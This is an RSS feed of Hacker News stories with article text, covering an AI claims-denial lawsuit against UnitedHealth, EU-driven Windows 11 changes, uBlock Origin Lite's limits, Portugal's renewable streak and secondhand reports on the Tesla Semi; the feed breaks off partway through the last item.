<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Fri, 17 Nov 2023 11:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[UnitedHealth uses AI model with 90% error rate to deny care, lawsuit alleges (117 pts)]]></title>
            <link>https://arstechnica.com/health/2023/11/ai-with-90-error-rate-forces-elderly-out-of-rehab-nursing-homes-suit-claims/</link>
            <guid>38299921</guid>
            <pubDate>Fri, 17 Nov 2023 05:25:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/health/2023/11/ai-with-90-error-rate-forces-elderly-out-of-rehab-nursing-homes-suit-claims/">https://arstechnica.com/health/2023/11/ai-with-90-error-rate-forces-elderly-out-of-rehab-nursing-homes-suit-claims/</a>, See on <a href="https://news.ycombinator.com/item?id=38299921">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <header>
            <h4>
      despicable     —
</h4>
            
            <h2 itemprop="description">For the largest health insurer in the US, AI's error rate is like a feature, not a bug.</h2>
                    </header>
        <section>
            <div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/11/GettyImages-1543156724-800x533.jpeg" alt="UnitedHealthcare (UHC) health insurance company signage is displayed on an office building in Phoenix on July 19, 2023.">
      <figcaption><p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/11/GettyImages-1543156724-scaled.jpeg" data-height="1707" data-width="2560">Enlarge</a> <span>/</span> UnitedHealthcare (UHC) health insurance company signage is displayed on an office building in Phoenix on July 19, 2023.</p></figcaption>  </figure>

  




<!-- cache hit 92:single/related:1370c992e84e2c6e4e3bcb4cfc8a7d63 --><!-- empty -->
<p>UnitedHealthcare, the largest health insurance company in the US, is allegedly using a deeply flawed AI algorithm to override doctors' judgments and wrongfully deny critical health coverage to elderly patients. This has resulted in patients being kicked out of rehabilitation programs and care facilities far too early, forcing them to drain their life savings to obtain needed care that should be covered under their government-funded Medicare Advantage Plan.</p>
<p>That's all according to <a href="https://cdn.arstechnica.net/wp-content/uploads/2023/11/class-action-v-unitedhealth-and-navihealth-1.pdf">a lawsuit</a> filed this week in the US District Court for the District of Minnesota. The lawsuit is brought by the estates of two deceased people who were denied health coverage by UnitedHealth. The suit also seeks class-action status for similarly situated people, of which there may be tens of thousands across the country.</p>
<p>The lawsuit lands alongside <a href="https://www.statnews.com/2023/11/14/unitedhealth-algorithm-medicare-advantage-investigation/">an investigation by Stat News</a> that largely backs the lawsuit's claims. The investigation's findings stem from internal documents and communications the outlet obtained, as well as interviews with former employees of NaviHealth, the UnitedHealth subsidiary that developed the AI algorithm called nH Predict.</p>
<p>"By the end of my time at NaviHealth I realized: I'm not an advocate, I'm just a moneymaker for this company," Amber Lynch, an occupational therapist and former NaviHealth case manager, told Stat. "It's all about money and data points," she added. 'It takes the dignity out of the patient, and I hated that."</p>
<h2>AI-based denials</h2>
<p>According to the lawsuit, UnitedHealth started using nH Predict in at least November 2019, and it is still in use. The algorithm estimates how much post-acute care a patient on a Medicare Advantage Plan will need after an acute injury, illness, or event, like a fall or a stroke. Post-acute care can include things like therapy and skilled care from home health agencies, skilled nursing homes, and inpatient rehabilitation centers.</p>                                            
                                                        
<p>It's unclear how nH Predict works exactly, but it reportedly estimates post-acute care by pulling information from a database containing medical cases from 6 million patients. NaviHealth case managers plug in certain information about a given patient—including age, living situation, and physical functions—and the AI algorithm spits out estimates based on similar patients in the database. The algorithm estimates medical needs, length of stay, and discharge date.</p>
<p>But Lynch noted to Stat that the algorithm doesn't account for many relevant factors in a patient's health and recovery time, including comorbidities and things that occur during stays, like if they develop pneumonia while in the hospital or catch COVID-19 in a nursing home.</p>
<p>According to the Stat investigation and the lawsuit, the estimates are often draconian. For instance, on a Medicare Advantage Plan, patients who stay in a hospital for three days are typically entitled to up to 100 days of covered care in a nursing home. But with nH Predict, patients rarely stay in nursing homes for more than 14 days before receiving payment denials from UnitedHealth.</p>
<p>When patients or their doctors have requested to see nH Predict's reports, UnitedHealth has denied their requests, telling them the information is proprietary, according to the lawsuit. And, when prescribing physicians disagree with UnitedHealth's determination of how much post-acute care their patients need, their judgments are overridden.</p>
<h2>Favorable failings</h2>
<p>The use of faulty AI is not new for the health care industry. While AI chatbots and image generators are currently grabbing headlines and causing alarm, the health care industry in the US has a longer record of problematic AI use, including establishing <a href="https://www.healthaffairs.org/content/forefront/medical-algorithms-failing-communities-color">algorithmic racial bias</a> in patient care. But, what sets this situation apart is that the dubious estimates nH Predict spits out seem to be a feature, not a bug, for UnitedHealth.</p>
<p>Since UnitedHealth acquired NaviHealth in 2020, former employees told Stat that the company's focus shifted from patient advocacy to performance metrics and keeping post-acute care as short and lean as possible. Various statements by UnitedHealth executives echoed this shift, Stat noted. In particular, the UnitedHealth executive overseeing NaviHealth, Patrick Conway, was quoted in a company podcast saying: "If [people] go to a nursing home, how do we get them out as soon as possible?"</p>

                                                </div>

            
                            <nav>Page: <span>1 <a href="https://arstechnica.com/health/2023/11/ai-with-90-error-rate-forces-elderly-out-of-rehab-nursing-homes-suit-claims/2/">2</a> <a href="https://arstechnica.com/health/2023/11/ai-with-90-error-rate-forces-elderly-out-of-rehab-nursing-homes-suit-claims/2/"><span>Next <span>→</span></span></a></span></nav>
            
        </section>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[No Bing, no Edge, no upselling: De-crufted Windows 11 coming to Europe soon (254 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2023/11/europeans-can-soon-strip-bing-edge-other-microsoft-cruft-from-windows-11/</link>
            <guid>38298918</guid>
            <pubDate>Fri, 17 Nov 2023 03:03:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2023/11/europeans-can-soon-strip-bing-edge-other-microsoft-cruft-from-windows-11/">https://arstechnica.com/gadgets/2023/11/europeans-can-soon-strip-bing-edge-other-microsoft-cruft-from-windows-11/</a>, See on <a href="https://news.ycombinator.com/item?id=38298918">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h4>
      Digital Markets Act    —
</h4>
            
            <h2 itemprop="description">Some changes will arrive for non-EU users, too, but not the easy removals.</h2>
                    </div><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/11/win11-exhausting-800x450.jpg" alt="Windows 11 with a number of advertising pushes opened simultaneously">
      <figcaption><div><p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/11/win11-exhausting.jpg" data-height="1440" data-width="2560">Enlarge</a> <span>/</span> Users in the extended European Economic Area will soon be able to avoid most of the things that <a href="https://arstechnica.com/gadgets/2023/11/europeans-can-soon-strip-bing-edge-other-microsoft-cruft-from-windows-11/%22https://arstechnica.com/gadgets/2023/08/windows-11-has-made-the-clean-windows-install-an-oxymoron/%22">feel so exhausting about Windows 11</a>.</p></div><p>Andrew Cunningham</p></figcaption>  </figure>

  




<!-- cache hit 92:single/related:f82ceea55f6993117421e828afee04b9 --><!-- empty -->
<p>Using Windows these days means putting up with <a href="https://arstechnica.com/gadgets/2023/08/windows-11-has-made-the-clean-windows-install-an-oxymoron/">many, many pitches to use and purchase other Microsoft products</a>. Some are subtle, like the built-in Edge browser suggesting you use its "recommended settings" after each major update. Some are not so subtle, like testing a "quiz" that made some users <a href="https://arstechnica.com/gadgets/2023/11/microsoft-pulls-onedrive-update-that-would-quiz-you-before-letting-you-quit/">explain why they're trying to quit the OneDrive app</a>.</p>
<p>Those living in the <a href="https://www.gov.uk/eu-eea">European Economic Area (EEA)</a>—which includes the EU and adds Iceland, Liechtenstein, and Norway—will soon get the volume turned down on their Windows 11 systems. To meet the demands of <a href="https://digital-markets-act.ec.europa.eu/index_en">the European Commission's Digital Markets Act</a>—slated to be enforced in March 2024—Microsoft must make its apps easier to uninstall, its default settings easier to change, and its attempts at steering people toward its services easier to avoid.</p>
<p>Microsoft <a href="https://blogs.windows.com/windows-insider/2023/11/16/previewing-changes-in-windows-to-comply-with-the-digital-markets-act-in-the-european-economic-area/">writes in a blog post</a> that many of these changes will be available in a preview update of Windows 11 (version 23H2) this month. Windows 10 will get similar changes "at a later date." A couple of changes affect all Windows 10 and 11 users:</p>
<ul>
<li>Apps that are critical to Windows will be labeled with a "System" tag in Settings, the Start menu, and search results</li>
<li>Camera, Cortana, and Photos can now be uninstalled</li>
</ul>                                            
                                                        
<p>In the EEA, much more is on the way:</p>
<ul>
<li>Bing's web search from the Start menu and the Edge browser can be uninstalled</li>
<li>Third parties can add to the Windows Widgets Board feeds</li>
<li>Third parties, like Google or DuckDuckGo, can provide the built-in web search results that Bing once had exclusively</li>
<li>Windows users who choose to sync their Microsoft accounts will have their pinned apps and preferences synced, seemingly keeping their EEA-enabled choices</li>
<li>Windows will now "always use customers' configured app default settings for link and file types"</li>
</ul>
<p>Microsoft's post notes that Windows uses the region picked during Windows install to offer the EEA-exclusive options. Only a PC reset can undo the options. EEA Windows devices will also not get the <a href="https://arstechnica.com/information-technology/2023/11/bing-chat-is-now-microsoft-copilot-in-potentially-confusing-rebranding-move/">Microsoft Copilot preview</a> that is rolling out in other markets.</p>
<p>The Digital Markets Act's impending arrival <a href="https://arstechnica.com/tech-policy/2022/03/eu-to-regulate-gatekeepers-in-crackdown-on-google-apple-amazon-facebook/">will impact other major tech firms</a> that are considered "gatekeepers" providing "core platform services" that are "most prone to unfair business practices." Google has recently pitched the European Union on the idea of <a href="https://arstechnica.com/gadgets/2023/11/google-argues-imessage-should-be-regulated-by-the-eus-digital-markets-act/">forcing Apple to make iMessage interoperable</a> under the Act. Apple has reportedly worked on changes to iOS that <a href="https://arstechnica.com/gadgets/2022/12/report-apple-engineers-are-working-on-third-party-app-store-support-in-ios/">would allow "sideloading" apps</a> outside Apple's own App Store, while another provision in the Digital Markets Act would demand developers be able to use their preferred payments systems.</p>
<p>A companion piece of legislation focused on online platforms, the Digital Services Act, <a href="https://arstechnica.com/tech-policy/2023/04/google-runs-5-of-the-19-platforms-that-must-follow-eus-new-internet-rules/">will impact 19 platforms</a>, including five Google services, Meta-owned Facebook and Instagram, and Microsoft's Bing search engine. On Wednesday, Meta became the first platform to <a href="https://arstechnica.com/tech-policy/2023/11/meta-tiktok-fight-eu-gatekeeper-status-to-avoid-opening-up-services-to-rivals/">appeal its gatekeeper status</a> for its Messenger and Marketplace services, <a href="https://newsroom.tiktok.com/en-eu/appealing-our-gatekeeper-designation-under-the-digital-markets-act">followed shortly thereafter by TikTok</a>.</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google confirms they will disable uBlock Origin in Chrome in 2024 (198 pts)]]></title>
            <link>https://old.reddit.com/r/uBlockOrigin/comments/17wu2gz/google_confirms_they_will_disable_ublock_origin/</link>
            <guid>38298502</guid>
            <pubDate>Fri, 17 Nov 2023 02:17:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://old.reddit.com/r/uBlockOrigin/comments/17wu2gz/google_confirms_they_will_disable_ublock_origin/">https://old.reddit.com/r/uBlockOrigin/comments/17wu2gz/google_confirms_they_will_disable_ublock_origin/</a>, See on <a href="https://news.ycombinator.com/item?id=38298502">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Yes, but ublock origin lite lacks a lot of features that actually makes ublock the best:</p>

<p><a href="https://preview.redd.it/lbgozpmljr0c1.png?width=649&amp;format=png&amp;auto=webp&amp;s=33863c01942ae5fda6de2a6e95995e76e3a29241" target="_blank">&lt;image&gt;</a></p>

<p>Source: <a href="https://www.reddit.com/r/uBlockOrigin/comments/1067als/eli5_ublock_lite_vs_ublock_origin/">https://www.reddit.com/r/uBlockOrigin/comments/1067als/eli5_ublock_lite_vs_ublock_origin/</a></p>

<p>Not being able to update the filters without having to update the extension itself is a really big deal! I mean when ublock 1.53 came out, it took google almost a freaking week to finally allow the new version.</p>

<p>Why is that a big deal? Imagine that you have a site that you use a lot, that site then implements a way to detect adblock but you are stuck with ublock origin lite, in other words, you can't craft your own filter to by pass that site anti-adblocking(if you have the know how), you can't also come to ubo reddit to ask someone else to craft them for you and with that instantly solve the issue and you also don't have access to element picker which could also solve problem!</p>

<p>Now, the only thing you can do? Report the problem to ubo team, then wait until they add the new filter which will bypass the antiblock to the new version of ubo lite which you don't know when its getting released and after that you will have to wait until google authorizes the new update to be released which like I've said, takes several days!</p>

<p>Another example is youtube itself, if we were stuck with <strong>ubo lite</strong> right now, we would be losing the war against youtube anti-adblock badly! Because the only reason ubo is kinda able to keep up with youtube anti-adblocking is because after youtube updates their blocking script(which is every 12 hours), ubo team then updates their filters and then we as users just need to run the update manually inside the extension and boom we are back on business! Which won't be possible with ubo lite at all.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Portugal just ran on 100% renewables for six days in a row (308 pts)]]></title>
            <link>https://www.canarymedia.com/articles/clean-energy/portugal-just-ran-on-100-renewables-for-six-days-in-a-row</link>
            <guid>38297805</guid>
            <pubDate>Fri, 17 Nov 2023 00:49:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.canarymedia.com/articles/clean-energy/portugal-just-ran-on-100-renewables-for-six-days-in-a-row">https://www.canarymedia.com/articles/clean-energy/portugal-just-ran-on-100-renewables-for-six-days-in-a-row</a>, See on <a href="https://news.ycombinator.com/item?id=38297805">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p dir="ltr">One recent autumn afternoon, I&nbsp;watched the Atlantic gusts collide with the cliffs that rise above Nazaré, Portugal. Rain pelted down, and the world-renowned swells rose into walls of water that even the most <a href="https://www.youtube.com/watch?v=GJc4Ir78KdE" target="_blank" rel="noreferrer noopener">death-defying surfers</a> reach only via Jet Ski. For me, this looked like a&nbsp;rained-out, late-season beach getaway, but for the sliver of Iberia that is Portugal, it looked like a&nbsp;bright future. That weekend, the nation of <span>10</span> million <a href="https://www.ren.pt/en-gb/media/news/portugal-has-been-using-green-electricity-for-over-24-hours" target="_blank" rel="noreferrer noopener">ran on nothing but wind, solar and hydropower.&nbsp;</a></p>
<p dir="ltr">As it turned out, those rainy, blustery days were just a&nbsp;warmup. Portugal produced more than enough renewable power to serve all its customers for <a href="https://www.ren.pt/en-gb/media/news/renewable-energy-production-sets-new-records" target="_blank" rel="noreferrer noopener">six straight days</a>, from October <span>31</span> to November <span>6</span>.</p>
<p dir="ltr"><span>“</span>The gas plants were there, waiting to dispatch energy, should it be needed. It was not, because the wind was blowing; it was raining a&nbsp;lot,” said Hugo Costa, who oversees Portugal for <span>EDP</span> Renewables, the renewables arm of the state utility, which was <a href="https://ec.europa.eu/economy_finance/publications/occasional_paper/2012/pdf/ocp95_en.pdf" target="_blank" rel="noreferrer noopener">privatized in <span>2012</span></a>. <span></span>​<span>“</span>And we were producing with a&nbsp;positive impact to the consumers because the prices have dropped dramatically, almost to&nbsp;zero.”</p>
<p dir="ltr">To hit Paris Agreement climate goals by <span>2050</span>, nations need to run their grids without carbon emissions not just for three or six days, but year-round. A&nbsp;handful of countries already do this, thanks to generous endowments of hydropower, largely developed well before the climate crisis drove investment decisions for power plants. Others score highly on carbon-free power thanks to big fleets of nuclear plants.</p>
<p dir="ltr">Portugal falls into a&nbsp;different, more relatable bucket: It started its decarbonization journey with some legacy hydropower, but no nuclear capacity nor plans to build any. That meant it had to figure out how to cut fossil fuel use by maximizing new renewables.</p>
<p dir="ltr">How did Portugal make this happen? It committed to building renewables early and often, pledging a&nbsp;<span>2050</span> deadline for net-zero carbon emissions <a href="https://unfccc.int/sites/default/files/resource/RNC2050_EN_PT%20Long%20Term%20Strategy.pdf" target="_blank" rel="noreferrer noopener">in <span>2016</span></a>, several years before the European Union as a&nbsp;whole found the conviction to <a href="https://www.france24.com/en/20191213-european-union-brussels-carbon-neutral-green-deal-2050-poland-climate-change" target="_blank" rel="noreferrer noopener">take that step</a>. Portugal’s last coal plants shut down in <span>2022</span>, leaving (imported) fossil gas as the backstop for on-demand power.</p>

<p dir="ltr"><span>“</span>The key conclusion, in my opinion, is that it shows that the Portuguese grid is prepared for very high shares of renewable electricity and for its expected variation: We were able to manage both the sharp increase of hydro and wind production, and also the return to a&nbsp;lower share of renewables, when natural-gas power plants were requested again to supply some of the country’s demand,” said <a href="https://expresso.pt/autores/2015-05-02-Miguel-Prado-14b44dbf" target="_blank" rel="noreferrer noopener">Miguel Prado</a>, who covers Portugal’s energy sector for <em>Expresso</em> newspaper.</p>
<p dir="ltr">The task ahead for Portugal’s grid decarbonization is to reduce and ultimately eliminate the number of hours when the country needs to burn gas to keep the lights on. Leaders want gas generation, which made up <a href="https://www.ren.pt/en-gb/media/news/renewables-supplied-67-of-the-electricity-consumed-in-october" target="_blank" rel="noreferrer noopener"><span>21</span>% of electricity consumption</a> from January through October, to <a href="https://www.reuters.com/sustainability/climate-energy/portugal-doubles-2030-goals-solar-hydrogen-capacity-2023-07-03/" target="_blank" rel="noreferrer noopener">end completely by <span>2040</span></a>.</p>
<p dir="ltr">To reach its climate goals, Portugal has focused on diversification of renewable resources; instead of depending primarily on wind, water or sun, it blends each into the portfolio and finds ways to make them more complementary. The country’s power companies are now chasing major additional offshore wind opportunities, expanding solar installations and repowering older onshore wind projects to get more out of the best locations.</p>
<h2><strong>Anatomy of a&nbsp;six-day clean energy streak</strong></h2>
<p dir="ltr">After the <a href="https://en.wikipedia.org/wiki/Carnation_Revolution" target="_blank" rel="noreferrer noopener">overthrow of the authoritarian Estado Novo dictatorship</a> in <span>1974</span>, the newly formed state utility Energias de Portugal constructed a&nbsp;series of hydroelectric dams on the once-wild rivers that rushed from the eastern mountains to the western coast. The company built its first onshore wind projects in the <span>1990</span>s, when solar simply couldn’t compete economically, and solar installations have only recently started to catch&nbsp;up.</p>
<p dir="ltr">That’s why the gray skies didn’t hurt overall renewable production during the country’s recent record-setting stretch, as they would have in, say, California or Hawaii. The wind and hydro were cranking, and that’s what mattered.</p>
<p dir="ltr">Any milestone in the rapidly evolving clean energy sector should come with specific parameters. So what exactly did the Portuguese grid accomplish earlier this&nbsp;month?</p>
<p dir="ltr">The six-day record refers to the <a href="https://www.ren.pt/en-gb/media/news/renewable-energy-production-sets-new-records" target="_blank" rel="noreferrer noopener"><span>149</span> consecutive hours</a> in which <span></span>​<span>“</span>energy from renewable sources exceeded the industrial and household consumption needs across the country.” The country’s previous record for that metric was <span>131</span>&nbsp;hours (a little over five days), achieved in <span>2019</span>. That doesn’t mean that fossil fuel plants weren’t operating — just that the overall renewable generation more than met customer needs.</p>
<p dir="ltr">But Portugal also just set a&nbsp;national record for meeting the entire electricity system’s needs <span></span>​<span>“</span>without resorting to conventional thermal power generation.” This gas-free stretch started Halloween night and ran for <span>131</span> consecutive hours, about <span>5</span>&nbsp;days, nearly tripling Portugal’s previous record of <span>56</span>&nbsp;hours straight in <span>2021</span>. And for <span>95</span> of those consecutive hours, Portugal exported clean electricity to Spain, because it consistently had more than it needed — again without burning gas.</p>
<p dir="ltr">That trendline is the thing to watch. Renewables-friendly weather will come and go, and shoulder months are ripe for renewables to outpace consumer demand because heating or cooling needs are lower than in the summer and winter. But the last time Portugal had ideal conditions for a&nbsp;renewables record, it only lasted one-third as long without burning gas. As more wind and solar capacity comes online, Portugal expands its arsenal for running entirely on renewables.</p>
<p dir="ltr">This particular week stood out, but it exemplifies a&nbsp;historic shift in energy sources. Natural-gas use for Portugal’s electricity production <a href="https://www.ren.pt/en-gb/media/news/renewables-supplied-67-of-the-electricity-consumed-in-october" target="_blank" rel="noreferrer noopener">fell <span>39</span>% year-over-year</a> for the period from January to October, according to <span>REN</span>. That brought overall gas use to its lowest level since&nbsp;<span>2006</span>.</p>
<p dir="ltr">Portugal has made grid decarbonization perfectly tangible for itself. To reach its climate goals, it needs to take the playbook from this one week in November and run it for longer periods of time, until eventually it doesn’t even need gas on standby. And it has to do so even in the parts of the year when the winds and the rain don’t lash the off-season traveler who’d heard so much about a&nbsp;climate reminiscent of Southern California.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Tesla Semi from an Insider's View After One Year: "Hot Mess" (147 pts)]]></title>
            <link>https://bradmunchen.substack.com/p/scoop-the-tesla-semi-from-an-insiders</link>
            <guid>38297765</guid>
            <pubDate>Fri, 17 Nov 2023 00:44:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bradmunchen.substack.com/p/scoop-the-tesla-semi-from-an-insiders">https://bradmunchen.substack.com/p/scoop-the-tesla-semi-from-an-insiders</a>, See on <a href="https://news.ycombinator.com/item?id=38297765">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg" width="548" height="364" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:364,&quot;width&quot;:548,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:39763,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6478aa6a-9844-4b48-abf2-e76d492c4df2_548x364.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>After a nearly 5 years since being announced in 2017, the Tesla Semi was finally launched with great fanfare to its first customer, PepsiCo, on December 1, 2022. But, there was absolutely no data was given on pricing, Autopilot use, battery pack size, or Tesla’s original 1 million-mile guarantee of lifetime range. In fact, the status of the Tesla Semi has been classified as “pilot production” in Tesla’s Shareholder Deck for the past year since its launch and Tesla Semi drivers are forbidden (most likely by non-disclosure agreements) from speaking about the Semi, as CNBC reported </span><a href="https://www.youtube.com/watch?v=l-BVM673pDs&amp;t=828s&amp;ab_channel=CNBC" rel="">here</a><span> (watch from 8:20). </span></p><p>This is why it was with great fortune to receive the details below, which were told to a trusted automotive source of mine by a PepsiCo employee who happened to have time for my friend’s questions about the Semi at a charging station the other day (my friend has owned a Tesla and many other EVs). </p><p>But let’s first look at what Tesla promised about the Semi back in 2017, when they first revealed the new product and said it would be in production by 2019: </p><ul><li><p>500-mile range (800 km) at a maximum load of 82,000 lbs or 37,195 kg</p></li><li><p>0-60 mph in 5 seconds vs 20 seconds for a diesel semi</p></li><li><p>100,000 in output by 2022 (only 90 Semis have been produced through October 2023, according to InsideEVs)</p></li></ul><p>And after one year since its first deliveries to PepsiCo, Tesla has yet to divulge any data on the Tesla Semi except for a tweet from Elon Musk saying that the battery efficiency was 1.7 kWh per mile (a useful number to have with the details from PepsiCo below).  </p><p>Below are the comments from a PepsiCo employee about the Tesla Semi. Please note that the text within parentheses are my comments, not that of the PepsiCo employee who provided the comments. </p><ul><li><p><strong>PepsiCo only gets 400 miles at best with a full payload of 82,000 lbs (37,195 kg) on their Tesla Semis</strong><span> [</span><em>this implies a much smaller battery pack than expected, as Musk said battery efficiency for the Semi is 1.7 kWh per mile, which implies a battery pack size of only around 700 kWh; at a 500-mile range, the assumption was the Semi had a battery pack size of at least 1,000 kWh</em><span>]. </span></p></li><li><p><strong>The constant use of the battery pack is unprecedented and is causing reliability problems for Tesla and other EV truck makers</strong><span> [s</span><em>imilar claims coming from Uber drivers who use their Teslas over 300 miles per day, i.e., their batteries are dying quickly. This is a hidden cost that that Tesla Semi customers need to account for; if a 100 kWh battery pack for a Model S costs roughly $25,000 to replace, the Semi’s battery pack should be at least $170,000]</em><span>.&nbsp; </span></p></li><li><p><strong>PepsiCo did a 500-mile trip with the Tesla Semi from California to Phoenix, but it was just for PR purposes. The batteries completely burned out, which is why on PR trips like this, they bring three Tesla Semis, with two being towed on a diesel Semi truck, only to be swapped out when the battery dies the other two Semis on the 500-mile drive</strong><span> [</span><em>this is why Tesla classifies the Semi as being in “pilot production”: the battery pack is not strong enough to deliver all the specs on range, etc. which Tesla promised in 2017</em><span>].&nbsp; </span></p></li></ul><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg" width="1425" height="805" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/fc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:805,&quot;width&quot;:1425,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:101522,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 424w, 